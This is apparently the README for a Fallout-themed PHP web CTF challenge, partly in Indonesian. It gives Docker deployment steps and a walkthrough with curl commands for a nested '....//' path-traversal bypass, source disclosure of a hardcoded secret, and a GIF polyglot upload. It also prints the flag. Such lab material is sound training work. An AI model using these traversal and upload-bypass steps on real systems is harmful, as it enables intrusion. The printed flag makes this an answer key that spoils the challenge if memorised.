# CTF Challenge: Vault-Tec Terminal Overseer v4.2 (Fallout Theme)

## Overview
- **Category:** Web Exploitation (PHP Server-Side Challenge)
- **Theme:** Fallout Pip-Boy / RobCo Industries Terminal (Vault 42)
- **Difficulty:** **Medium (3.5 / 5.0)**
- **Target Port:** `5002` (mapped to Apache port `80`)
- **Flag Path:** `/flag.txt`
- **Flag Content:** `NCS{P4tH_tR4v3rs4L_4nd_uPl04d_M4st3r}`

---

## File Structure
```text
netclub/chals/serverside/
├── Dockerfile              # PHP 8.1 Apache base image + AllowOverride .htaccess setup
├── docker-compose.yml      # Port binding 5002:80
├── .dockerignore           # Build exclusions
├── flag.txt                # System flag key (/flag.txt)
├── index.php               # RobCo Vault-Tec Terminal Dashboard & Holotape Ingestion
├── vault_auth.php          # Internal authentication controller & NODE_MASTER_SECRET
├── view.php                # Single-pass Directory Traversal previewer & lockout guard
├── uploads/                # Storage repository
│   ├── .htaccess           # Disables PHP script execution in uploads/
│   ├── backup_manifest.txt
│   ├── node_status.txt     # In-universe Vault terminal logs
│   └── vault_memo.txt
└── README.md               # Challenge documentation & solution walkthrough
```

---

## Deployment Instructions

### Menggunakan Docker Compose (Direkomendasikan)
```bash
docker compose up -d --build
```
Akses di browser: `http://localhost:5002`

### Reset Challenge (Mulai Ulang dari Awal)
Untuk mereset lab agar bersih dan terkunci kembali ke kondisi semula:
```bash
./reset.sh
```
*(Atau via Docker: `sudo docker compose down && sudo docker compose up -d`)*

### Menggunakan PHP Built-in Server (Cepat / Pengujian Lokal)
```bash
php -S 0.0.0.0:5002
```

---

## Full Exploitation Walkthrough (Step-by-Step)

### Tahap 1: Rekognisi & Deteksi Lockout
Saat peserta mencoba membaca flag langsung menggunakan bypass penelusuran jalur:
```bash
curl -s "http://localhost:5002/view.php?file=....//....//....//....//flag.txt"
```
Terminal mengembalikan pesan penolakan:
> `ERROR 0x7E: SYSTEM RESTRICTION. Root sector access requires valid Overseer authentication credentials.`

---

### Tahap 2: Source Code Disclosure via Single-Pass Bypass
Berdasarkan log terminal pada `node_status.txt`, berkas konfigurasi internal berada di `vault_auth.php`.
Gunakan teknik nested filter `....//` untuk membaca kode sumber `vault_auth.php`:
```bash
curl -s "http://localhost:5002/view.php?file=....//vault_auth.php"
```
Dari respons kode sumber, peserta menemukan:
```php
define('NODE_MASTER_SECRET', 'VD-SECRET-KEY-9821a7c4f3b0');
```
Serta kriteria validasi berkas:
1. Header `Content-Type` harus `image/gif`, `image/png`, atau `image/jpeg`.
2. Magic bytes asli (`finfo`) harus valid sebagai gambar (misal header GIF `GIF89a`).
3. Payload di dalam gambar harus mengandung string `VD-SECRET-KEY-9821a7c4f3b0`.

---

### Tahap 3: Pembuatan Berkas Polyglot (Magic Bytes + Secret Seal)
Peserta membuat berkas *polyglot* dengan *magic bytes* valid gambar GIF:
```bash
echo -e "GIF89a\nVD-SECRET-KEY-9821a7c4f3b0" > seal.gif
```

---

### Tahap 4: Ingestion & Aktivasi Node Storage
Kirim berkas *polyglot* ke endpoint `index.php`:
```bash
curl -F "file=@seal.gif;type=image/gif" http://localhost:5002/index.php
```
Sistem memvalidasi:
- MIME Header: `image/gif` (Lolos)
- Magic Bytes (`finfo`): `image/gif` (Lolos)
- Token Verifikasi: Mengandung `VD-SECRET-KEY-9821a7c4f3b0` (Lolos)

Sistem mengaktifkan tanda otorisasi node (`.node_seal_active`) dan membuka proteksi master partition.

---

### Tahap 5: Pengambilan Flag
Setelah status terminal menjadi **OVERSEER ACCESS GRANTED**, flag dapat diambil melalui:
1. Membuka dashboard utama: `http://localhost:5002/index.php` (banner flag muncul di terminal).
2. Membaca kembali `/flag.txt` melalui `view.php`:
```bash
curl -s "http://localhost:5002/view.php?file=....//....//....//....//flag.txt" | grep "NCS{"
```
**Output:**
```text
NCS{P4tH_tR4v3rs4L_4nd_uPl04d_M4st3r}
```
